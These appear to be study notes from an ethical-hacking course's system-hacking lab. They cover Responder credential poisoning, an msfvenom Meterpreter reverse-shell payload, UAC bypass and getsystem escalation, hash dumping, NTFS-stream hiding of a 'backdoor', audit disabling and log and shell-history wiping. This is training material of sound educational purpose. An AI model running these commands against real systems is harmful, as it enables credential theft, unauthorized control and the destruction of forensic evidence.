6-System Hacking

    Gain access to the system
        Perform active online attack to crack the system’s password using Responder
            Since the awareness of this attack is low, there is a good chance of acquiring user credentials in an internal network penetration test. By listening for LLMNR/NBT-NS
            Responder is an LLMNR, NBT-NS, and MDNS poisoner.
            sudo ./Responder.py -I eth0 (-I: specifies the interface (here, eth0).)
            sudo john [Log File Name.txt]
        Audit system passwords using L0phtCrack
            using graphical tool for craking password in a machine!!!!
        Find vulnerabilities on exploit sites
            exploit-db, VulDB (https://vuldb.com), MITRE CVE (https://cve.mitre.org), Vulners (https://vulners.com), and CIRCL CVE Search (https://cve.circl.lu)
        Exploit client-side vulnerabilities and establish a VNC session
            Desktop (VNC)(Virtual Network Computing) enables an attacker to remotely access and control the targeted computers using another computer or mobile device from anywhere in the world. 
            msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 -f exe LHOST=[IP Address of Host Machine] LPORT=444 -o /root/Desktop/Test.exe
            PowerUp.ps1 is a program that enables a user to perform quick checks against a Windows machine for any privilege escalation opportunities. It utilizes various service abuse checks, .dll hijacking opportunities, registry checks, etc. to enumerate common elevation methods for a target system.
            in win shell:powershell -ep Bypass -Command “. .\PowerUp.ps1;Invoke-AllChecks”
        Gain access to a remote system using Armitage
            metasploit visual
        Hack a Windows machines with a malicious Office document using TheFatRat
            theFatRat complete for doing malicious files....
        Perform buffer overflow attack to gain access to a remote system
            Cretinga a file to perform a buffer overflow

    Perform privilege escalation to gain higher privileges
        Escalate privileges using privilege escalation tools and exploit client-side vulerabilitiesç
            BeRoot and linpostexp allow you to run a configuration assessment on a target system to find information about the underlying vulnerabilities of system resources such as services, file and directory permissions, kernel version, and architecture. 
            meterpreter session. Type upload /home/attacker/Desktop/BeRoot/beRoot.exe
            Another method for performing privilege escalation is to bypass the user account control setting (security configuration) using an exploit, and then to escalate the privileges using the Named Pipe Impersonation technique.
            let us check our current system privileges by executing the run post/windows/gather/smart_hashdump command.
            getsystem -t 1: Uses the service – Named Pipe Impersonation (In Memory/Admin) Technique.
            Now, we will use the bypassuac_fodhelper exploit for windows. To do so, type use exploit/windows/local/bypassuac_fodhelper and press Enter.
            At this stage, we shall re-issue the getsystem command with the -t 1 switch to elevate privileges. To do so, type getsystem -t 1 and press Enter.
        Hack a Windows machine using Metasploit and perform post-exploitation using Meterpreter
            While performing post-exploitation activities, an attacker tries to access files to read their contents. Upon doing so, the MACE (modified, accessed, created, entry) attributes immediately change, which indicates to the file user or owner that someone has read or modified the information.

    Maintain remote access and hide malicious activities
        User system monitoring and surveillance using Power Spy
            complete for spyware
        User system monitoring and surveillance using Spytech SpyAgent
            You can also use other spyware tools such as ACTIVTrak (https://activtrak.com), Veriato Cerebral (https://www.veriato.com), NetVizor (https://www.netvizor.net), and SoftActivity Monitor (https://www.softactivity.com) to perform system monitoring and surveillance on the target system.
        Hide files using NTFS streams
            Now, type ´type c:\magic\calc.exe > c:\magic\readme.txt:calc.exe´ and press Enter. This command will hide calc.exe inside the readme.txt.
            In the Command Prompt, type ´mklink backdoor.exe readme.txt:calc.exe´ and press Enter.
        Hide data using white space steganography
            Snow is a program that conceals messages in text files by appending tabs and spaces to the end of lines, and that extracts hidden messages from files containing them.
            snow -C -m "My swiss bank account number is 45656684512263" -p "magic" readme.txt readme2.txt
            Now, type snow -C -p "magic" readme2.txt. It will show the content of readme.tx
        Image steganography using OpenStego
            Visual  such as QuickStego (http://quickcrypto.com), SSuite Picsel https://www.ssuitesoft.com), CryptaPix (https://www.briggsoft.com), and gifshuffle (http://www.darkside.com.au) to perform image steganography on the target system.
        Covert channels using Covert_TCP

    Clear logs to hide the evidence of compromise
            Various techniques used to clear the evidence of security compromise are as follow:

            Disable Auditing: Disable the auditing features of the target system
            Clearing Logs: Clears and deletes the system log entries corresponding to security compromise activities
            Manipulating Logs: Manipulate logs in such a way that an intruder will not be caught in illegal actions
            Covering Tracks on the Network: Use techniques such as reverse HTTP shells, reverse ICMP tunnels, DNS tunneling, and TCP parameters to cover tracks on the network.
            Covering Tracks on the OS: Use NTFS streams to hide and cover malicious files in the target system
            Deleting Files: Use command-line tools such as Cipher.exe to delete the data and prevent its future recovery
            Disabling Windows Functionality: Disable Windows functionality such as last access timestamp, Hibernation, virtual memory, and system restore points to cover tracks
        View, enable, and clear audit policies using Auditpol
            Type auditpol /get /category:*
            auditpol /set /category:"system","account logon" /success:enable /failure:enable 
            Type auditpol /get /category:* and press Enter to check whether the audit policies are cleared.
            No Auditing indicates that the system is not logging audit policies.
        Clear Windows machine logs using various utilities
            Clear_Event_Viewer_Logs.bat is a utility that can be used to wipe out the logs of the target system. This utility can be run through command prompt or PowerShell, and it uses a BAT file to delete security, system, and application logs on the target system. You can use this utility to wipe out logs as one method of covering your tracks on the target system
            Type wevtutil el and press Enter to display a list of event logs.el | enum-logs lists event log names. wevtutil is a command-line utility used to retrieve information about    event logs and publishers. You can also use this command to install and uninstall event manifests, run queries, and export, archive, and clear logs.
                cl | clear-log: clears a log, log_name is the name of the log to clear, and ex: is the system, application, and security.
            cipher /w:[Drive or Folder or File Location] and press Enter to deleted files in a specific drive, folder, or file.
                Here, we are encrypting the deleted files on the C: drive. You can run this utility on the drive, folder, or file of your choice.
                Cipher.exe is an in-built Windows command-line tool that can be used to securely delete a chunk of data by overwriting it to prevent its possible recovery. This command also assists in encrypting and decrypting data in NTFS partitions.
                When an attacker creates a malicious text file and encrypts it, at the time of the encryption process, a backup file is created. Therefore, in cases where the encryption process is interrupted, the backup file can be used to recover the data. After the completion of the encryption process, the backup file is deleted, but this deleted file can be recovered using data recovery software and can further be used by security personnel for investigation. To avoid data recovery and to cover their tracks, attackers use the Cipher.exe tool to overwrite the deleted files.
        Clear Linux machine logs using the BASH shell
            The Parrot Terminal window appears. Type export HISTSIZE=0 and press Enter to disable the BASH shell from saving the history.
                HISTSIZE: determines the number of commands to be saved, which will be set to 0.
            This command is an effective alternative to the disabling history command; with history -c, you have the convenience of rewriting or reviewing the earlier used commands.
            Similarly, you can also use the history -w command to delete the history of the current shell, leaving the command history of other shells unaffected.
            You can use all the above-mentioned commands in a single command by issuing shred ~/.bash_history && cat /dev/null > .bash_history && history -c && exit.
        Clear Windows machine logs using CCleaner
            You can also use the Custom Clean option, where you can analyze system files by selecting or deselecting different file options in the Windows and Applications tabs, as shown in the screenshot.
            Similarly, you can use the Registry option to scan for issues in the registry. Under the Tools option, you can do things like uninstall applications, get software update information, and get browser plugin information.
            You can also use other track-covering tools such as DBAN (https://dban.org), Privacy Eraser (https://www.cybertronsoft.com), Wipe (https://privacyroot.com), and BleachBit (https://www.bleachbit.org) to clear logs on the target machine.
